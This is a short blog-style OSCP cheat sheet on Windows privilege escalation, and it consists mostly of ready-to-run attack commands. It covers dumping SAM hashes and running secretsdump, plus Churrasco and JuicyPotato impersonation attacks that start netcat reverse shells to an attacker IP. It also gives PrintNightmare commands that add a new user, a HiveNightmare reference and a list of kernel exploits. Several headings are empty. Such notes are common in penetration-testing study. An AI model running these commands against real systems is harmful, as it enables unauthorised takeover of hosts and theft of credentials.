---
title: Windows Privilege Escalation
author: linatl
category: "OSCP"
date: "2021-03-13 00:01"
tags: [OSCP, Cheatsheet]
layout: post
---

###### Tricks to improve a crappy shell
```
rlwrap
> rlwrap -r nc -nvlp 443
```

###### Check Architecture of a PowerShell connection

~|32 bit folder|64 bit folder|
---|---|---
32-bit session | C:\Windows\system32\ | C:\Windows\sysNative
64-bit session | C:\Windows\sysWOW64\ | C:\Windows\system32

```
Check architecture of the host
> [system.environment]::Is64BitOperatingSystem

Check architecture of powershell environment:
> [Environment]::Is64BitProcess

alternative to check arch in ps environment:
> [IntPtr]::Size
The value of this property is 4 in a 32-bit process, and 8 in a 64-bit process.

For example: If you get a shell trough a webserver running in a 32bit process but the host is 64bit, powershell will by default open a 32bit process.
This can be solved by specifically calling powershell with the following path:
C:\Windows\sysNative\WindowsPowerShell\v1.0\powershell.exe

More info:
https://ss64.com/nt/syntax-64bit.html
```

###### Hashdump
```
Dumping SAM hashes from CMD:
https://miloserdov.org/?p=4129

reg save hklm\sam c:\sam
reg save hklm\system c:\system

Location:
C:/Windows/System32/config/SAM
C:/Windows/System32/config/SYSTEM

Dumping hashes from attack machine:
impacket-secretsdump domain.local/username@10.10.10.10 -just-dc
```

###### Token Kidnapping on Windows Server 2003 / 2008 with Churrasco

```
If you are Network Service or Local Service and SeImpersonatePrivilege is Enabled, this will probably work.

> git clone https://github.com/Re4son/Churrasco
after uploading the exe:

Execute Command
> churrasco.exe -d "whoami"
Using nc.exe to start a reverse shell connection
> churrasco.exe -d "c:\Users\username\Documents\nc.exe -e cmd.exe 192.168.1.1 443"
```

###### Potato attacks
```
If both SeChangeNotifyPrivilege and SeImpersonatePrivilege are enabled

Hot Potato
https://foxglovesecurity.com/2016/01/16/hot-potato/

Rotten Potato
https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/rottenpotato

Juicy Potato
https://github.com/ohpe/juicy-potato
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato
x86 variant:
https://github.com/ivanitlearning/Juicy-Potato-x86/releases/tag/1.2

Example juicy potato:

List of CLSID's:
http://ohpe.it/juicy-potato/CLSID/

On attacker system:
> nc -nvlp 80
On target system:
First upload nc.exe & JuicyPotato.exe, and place it in current dir
> JuicyPotato.exe -l 80 -p c:\cmd.exe -a "/c c:\nc.exe -e cmd.exe 192.168.1.1 80" -t *
Or using a different CLSID:
> JuicyPotato.exe -l 80 -p c:\cmd.exe -a "/c c:\nc.exe -e cmd.exe 192.168.1.1 80" -c {03ca98d6-ff5d-49b8-abc6-03dd84127020} -t *
```

###### RunAs
###### Registry Tricks
###### AlwaysInstallElevated
###### Autorun
###### Port Forwarding
###### Service Permissions
###### Unquoted Path
###### DLL Hijacking


###### Schtasks
```
schtasks /query /fo LIST /v
tasklist /SVC
```

###### PrintNightmare
```
https://github.com/calebstewart/CVE-2021-1675/

Run with (in powershell):
> powershell -exec bypass -command "& { Import-Module .\CVE-2021-1675.ps1; Invoke-Nightmare; }"
> Invoke-Nightmare -NewUser "username" -NewPassword "password" -DriverName "PrintMe"
```

###### HiveNightmare
```
https://github.com/GossiTheDog/HiveNightmare

Works on all supported versions of Windows 10, where System Protection is enabled (should be enabled by default in most configurations).
Check for vuln by checking if the patch for CVE-2021–36934 is installed, and by checking if system protection is enabled (with rstrui.exe ?)
```

###### Windows (Kernel) Exploits
```
MS10-059 (SecWiki)
MS11-046 (SecWiki)
MS16-032 (Use the one from Empire)
MS15-051 (SecWiki)
```

###### Kernel Exploits ~ Resources
```
Seclists
https://github.com/SecWiki/windows-kernel-exploits

Empire
https://github.com/EmpireProject/Empire/tree/master/data/module_source
```
